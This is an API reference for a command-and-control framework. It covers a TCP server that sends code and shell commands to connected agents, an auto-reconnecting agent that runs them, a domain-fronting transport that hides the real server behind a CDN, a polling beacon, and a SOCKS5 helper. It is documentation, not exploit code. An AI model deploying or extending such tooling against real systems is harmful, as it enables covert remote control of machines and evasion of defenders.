# C2 API Reference

---

## `C2Server` (`c2/server.py`)

Asyncio TCP server. Manages connected agents and dispatches commands.

```python
from c2.server import C2Server
```

### Constructor

```python
C2Server(
    host : str  = "0.0.0.0",
    port : int  = 4444,
    tls  : bool = False
)
```

When `tls=True`, the server loads `c2/server.crt` and `c2/server.key`.

### Methods

#### `async start()`

Starts the asyncio TCP listener. Does not block — call `run_forever()` to block until stopped.

#### `async stop()`

Closes the listener and disconnects all agents.

#### `run_forever()`

Synchronous entry point: creates an event loop, calls `start()`, and runs the loop until interrupted or `stop()` is called. Suitable for direct script use.

#### `list_agents() -> list[dict]`

Returns info about all currently connected agents:
```python
[
    {
        "sid":      str,   # session UUID
        "info":    dict,   # HELLO payload: hostname, platform, arch, pid, username
        "address": str     # remote IP:port
    }
]
```

#### `get_agent(sid: str) -> Optional[AgentSession]`

Looks up a connected session by its UUID. Returns `None` if not found or disconnected.

#### `async exec_all(code: str) -> dict[str, dict]`

Sends an `exec_code` command to every connected agent concurrently. Returns a dict keyed by session UUID, each value being the `RESULT` payload.

#### `async interactive_loop()`

Management shell that runs concurrently with the server. Commands:

| Command | Effect |
|---|---|
| `list` | Print connected agents |
| `exec <sid> <code>` | Execute `.jk` code on one agent |
| `execall <code>` | Execute `.jk` code on all agents |
| `quit` | Shut down server |

---

## `AgentSession` (`c2/server.py`)

Represents one connected agent. Obtained from `C2Server.get_agent(sid)` or created internally during `HELLO` handling.

### Methods

#### `async exec_script(path: str, timeout: float = 30.0) -> dict`

Sends a `CMD` frame with `action: "exec_script"` and `payload: path`. Awaits the `RESULT` frame (up to `timeout` seconds).

Returns the result dict:
```python
{
    "status": "ok" | "error",
    "output": str,   # stdout/stderr from the JIT execution
    "error":  str    # error message if status is "error"
}
```

#### `async exec_code(code: str, timeout: float = 30.0) -> dict`

Sends a `CMD` frame with `action: "exec_code"` and `payload: code` (raw `.jk` source). The agent writes it to a temp file and JIT-compiles it.

Returns the same result dict format as `exec_script`.

#### `deliver_result(msg: dict)`

Internal — called by the connection handler when a `RESULT` frame arrives. Resolves the pending future for the matching `cmd_id`.

---

## `C2Agent` (`c2/agent.py`)

Auto-reconnecting asyncio client. Connects to a `C2Server`, announces itself with `HELLO`, and handles incoming `CMD` frames.

```python
from c2.agent import C2Agent
```

### Constructor

```python
C2Agent(
    host      : str  = "127.0.0.1",
    port      : int  = 4444,
    tls       : bool = False,
    reconnect : bool = True
)
```

- `reconnect=True` re-connects after any disconnection with a 10-second delay.
- `tls=True` wraps the connection in SSL (no cert verification by default — suitable for self-signed certs in a research environment).

### Methods

#### `async run()`

Main entry point. Runs the reconnect loop. Each iteration calls `_run_session()`.

#### `stop()`

Sets a stop flag that causes `run()` to exit after the current session ends.

### Running the Agent

```python
import asyncio
from c2.agent import C2Agent

agent = C2Agent(host="192.168.1.100", port=4444)
asyncio.run(agent.run())
```

Or from the TUI's C2 panel.

### Command Handling

When a `CMD` frame arrives, the agent dispatches on `action`:

| Action | Handler |
|---|---|
| `exec_script` | `compile_jocky(payload_path, run_jit=True)` |
| `exec_code` | Write payload to temp `.jk` file, then `compile_jocky(tmp, run_jit=True)` |
| `shell` | `asyncio.create_subprocess_shell(payload)` |

Stdout and stderr are captured and returned in the `RESULT` frame.

---

## `FrontedTransport` (`c2/fronting.py`)

HTTP transport that routes requests through a CDN edge node to hide the real C2 server address.

```python
from c2.fronting import FrontedTransport
```

### Constructor

```python
FrontedTransport(
    c2_host    : str,          # real C2 domain (goes in HTTP Host header)
    c2_port    : int = 443,
    cdn_front  : str = "",     # CDN edge domain (actual TCP connection target)
    path       : str = "/beacon",
    use_https  : bool = True,
    proxy_host : str = "",     # SOCKS5 proxy host (optional)
    proxy_port : int = 1080,
    proxy_user : str = "",
    proxy_pass : str = ""
)
```

### Methods

#### `async post(payload: bytes) -> bytes`

Connects to `cdn_front` (or `c2_host` if no front set), sends an HTTP POST with:
- SNI = `cdn_front`
- `Host: c2_host`
- `Content-Type: application/octet-stream`
- Body = `payload`

Returns the response body.

#### `async get(params: str = "") -> bytes`

Same as `post` but uses HTTP GET with `params` as a query string.

---

## `FrontedBeacon` (`c2/fronting.py`)

Periodic poll loop using `FrontedTransport`.

```python
from c2.fronting import FrontedBeacon
```

### Constructor

```python
FrontedBeacon(
    transport : FrontedTransport,
    interval  : float = 60.0     # seconds between polls
)
```

### Methods

#### `async run(on_command=None)`

Polls `transport.post()` at `interval` seconds. If `on_command` is set, calls `on_command(parsed_json)` with each non-empty response.

#### `stop()`

Cancels the poll loop.

---

## `socks5_connect` (`c2/fronting.py`)

Establishes a SOCKS5-proxied TCP connection.

```python
from c2.fronting import socks5_connect
```

### Signature

```python
async socks5_connect(
    proxy_host : str,
    proxy_port : int,
    dest_host  : str,
    dest_port  : int,
    username   : str = "",
    password   : str = ""
) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]
```

Performs the full SOCKS5 handshake:
1. Method negotiation (no-auth if credentials are empty, USERNAME/PASSWORD otherwise).
2. Optional username/password authentication (RFC 1929).
3. CONNECT request using domain-type address encoding (ATYP=0x03).

Returns `(reader, writer)` for the proxied connection, usable as a regular asyncio stream. Raises `ConnectionError` on SOCKS5 refusal.
